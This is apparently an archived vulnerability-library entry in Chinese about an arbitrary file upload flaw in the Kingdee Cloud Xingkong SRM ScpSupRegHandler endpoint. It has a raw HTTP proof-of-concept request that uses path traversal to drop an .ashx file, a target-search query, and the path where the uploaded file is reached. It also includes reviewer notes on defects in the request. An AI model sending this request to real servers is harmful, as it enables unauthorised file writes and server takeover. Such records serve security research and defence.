---
source: "wy876 漏洞文库"
title: "金蝶云星空SRM ScpSupRegHandler路径文件上传"
product: "金蝶云星空SRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "三私有云产品V6.2含2017-12补丁至V8.1含2023-09；Windows尾点条件"
prerequisites: "无Cookie示例"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/wy876/POC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6OA%E4%BA%91%E6%98%9F%E7%A9%BA-ScpSupRegHandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-f6123f93eba353cbb58a6c77"
entity_id: "ve-f6123f93eba353cbb58a6c77"
schema_version: "1"
---

# 金蝶云星空SRM ScpSupRegHandler路径文件上传

## 条目说明

- 对象与具体问题：金蝶云星空SRM；ScpSupRegHandler路径文件上传
- 版本、配置及部署条件：三私有云产品V6.2含2017-12补丁至V8.1含2023-09；Windows尾点条件
- 认证与权限前提：无Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Accept与Cache-Control连写；结束boundary只有一个连字符；Content-Length固定与正文不符
- filename尾点及../需解释Windows规范化，纯11内容不证明ASHX执行；缺补丁出处

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞

#### 漏洞描述：
金蝶OA云星空 ScpSupRegHandler接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取服务器权限

#### 漏洞影响：

金蝶云星空企业版私有云、企业版私有云（订阅）、标准版私有云（订阅）三个产品V6.2(含17年12月补丁) 至 V8.1(含23年9月补丁)

#### 网络测绘：
```
app="金蝶云星空-管理中心"
```

#### 漏洞复现：
登陆页面
POC:
```http
POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 973
Accept-Language: zh-CN,zh;q=0.8
Accept: */*Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061

--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="dbId_v"

.
--2ac719f8e29343df94aa4ab49e456061

Content-Disposition: form-data; name="FID"

2022
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.ashx."
Content-Type: text/plain

11
--2ac719f8e29343df94aa4ab49e456061-
```

> 请求长度说明：原资料 Content-Length 为 973；保留原始标头；其数值未据实际请求体重新计算或验证。


#### 文件上传路径
```
访问路径：/K3Cloud/uploadfiles/Test.ashx
```


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
